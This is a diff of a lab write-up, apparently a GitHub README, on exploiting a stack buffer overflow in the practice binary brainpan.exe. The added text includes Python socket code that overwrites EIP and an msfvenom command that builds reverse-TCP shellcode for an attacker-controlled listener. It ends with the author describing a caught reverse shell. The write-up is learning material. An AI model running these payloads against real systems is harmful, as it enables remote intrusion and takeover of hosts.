@@ -133,7 +133,7 @@ with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
 
 ![imut_cyclic](https://user-images.githubusercontent.com/102399357/232202522-273177b5-403f-4766-b06a-34b2262fca47.png)
  
- **in my case the EIP value is 35724134 now in the he stack the value is stored in the Litte edian Format which means that the value is in reverse order so if we remove the value in revrerse order and convert to hex the pattern in the EIP will be 4Ar5 i have Demostrate the by using python3 interpreter manually finding the cyclic paattern as it is a Good Pratice**
+ **in my case the EIP value is 35724134 now in the he stack the value is stored in the Little edian Format which means that the value is in reverse order so if we remove the value in revrerse order and convert to hex the pattern in the EIP will be 4Ar5 i have Demostrate the by using python3 interpreter manually finding the cyclic paattern as it is a Good Pratice**
  
  <br />
  
@@ -160,7 +160,46 @@ with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
 
 <br />
 
-## Step 3 Finding The Bad Charaters.
+
+### Step 3 Overwriting EIP Registor.
+
+**Now We know the offest value is 524 to just check we will write + 4 "B"'s and check if EIP value is 41414141. **
+
+<br />
+
+```python
+import socket
+
+offset=524
+
+string="A"*offset+"BBBB"
+
+with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
+	c.connect(("192.168.94.131",9999))
+	c.recv(99999)
+	c.send(bytes(string+' \r\n',"utf-8"))
+	print("4 bytes overwritten on eip")
+	c.close()
+```
+
+**Over her we are Genearting "A" till offset times and then adding B four times.**
+
+<br  />
+
+![4bytes](https://user-images.githubusercontent.com/102399357/232209406-1cd3b6ff-d348-4437-9d00-d9798ef2ba54.PNG)
+
+<br />
+
+
+![44444444444444444](https://user-images.githubusercontent.com/102399357/232209465-fda7d0fa-b358-4a3b-8b3e-8fd557fa52f6.PNG)
+
+
+**if we see in immunity Debugger the EIP value is Set to Be 42424242 That is Amazing Now..!**
+
+
+
+
+## Step 4 Finding The Bad Charaters.
 ***what are Bad Charaters?
 Bad characters, in the context of exploit development and vulnerability testing, refer to specific bytes or characters that cannot be used in a payload or exploit code.These characters may cause issues such as crashing the application, corrupting the data, or interfering with the exploit's execution. Examples of bad characters include null bytes (0x00), carriage return (0x0d), and line feed (0x0a).***
 
@@ -222,7 +261,7 @@ with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
 
 **If Youll Want To use mona Modules then youll can go for it But in this exploit i will not go in depth of badchars as in brainpan.exe ther are no badchars except "\x00" which is an universal badchar**
 
-## Step 4 Finding the Right Module.
+## Step 5 Finding the Right Module.
 
 >**If we Type !mona modules**
 
@@ -252,12 +291,14 @@ with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
 
 <br />
 
-## Step 5 Genrating The Shell Code
+## Step 6 Genrating The Shell Code
 
 **Moving Furture We will Generate the Reverse TCP shellcode to bypass the firewall if it is Anabled Type the follwing Command To generate the shellCode**
 <br  />
 
 >msfvenom -p windows/shell_reverse_tcp LHOST=192.168.94.10 LPORT=4444 EXITFUNC=thread -b "\x00" -a x86 -f python.
+
+<br />
 
 ![msfpayloadcreationforshellcode](https://user-images.githubusercontent.com/102399357/232208498-91abee64-75a7-43e9-83e7-0e9295e154ed.PNG)
 
@@ -267,7 +308,7 @@ with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
 
 <br  />
 
-## Step 6 Exploit
+## Step 7 Exploit
 
 **This is the final stage of the Exploitation in which we will going to combine all the above codes and make one single python File named Exploit.py**
  <br />
@@ -325,4 +366,38 @@ with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as c:
 	c.close()
  ```
 
+**in the above code i am imported soome required modules furture i have created varibles named offset which is set to 524 junk var which is set to A into offest new_eip inwhich i have packed the Base address of the stack which we have found in Step 5 in Little Edian Format after that i have set paddig which are also knonw as nops means Do nothing which i is represteted in \x90 format i have generated padding into 30 times pagging will created some distance from EIP till ShellCode so that the it do not affect the program execution but serve to pad the payload and provide extra space for the exploit code to be inserted. The NOPs can be used to ensure that the exploit code is executed properly and that it starts at a specific memory address. After all the stuff make sure you Activated the Listiner On Your Linux Machine.**
+
+
+<br />
+
+
+![listing](https://user-images.githubusercontent.com/102399357/232210023-9f612619-e23b-4ad1-a925-06ce82006227.PNG)
+
+<br />
+
+**After Activating Listiner on the desire Port Number which is 4444 Run the Python Script.**
+
+<br />
+
+>python3 Exploit.py.
+
+<br />
+
+
+![maliciousBuffsentsucess](https://user-images.githubusercontent.com/102399357/232210168-c94aa118-4e78-4332-8ea1-6682f16dedf2.PNG)
+
+<br />
+
+
+**We Can see That our Pyload hase Been Sucessfully Sended..! Now if we see our Listiner Shell BOOMMMMMMM AND WE GOT THE SHELL FINALLY.**
+
+<br />
+
+![reverseshell](https://user-images.githubusercontent.com/102399357/232210233-5cb42151-475a-4623-aae1-ec36e27b1b92.PNG)
+
+<br />
+
+
+## And thats How i Exploted My First Buffer Overflow 
 
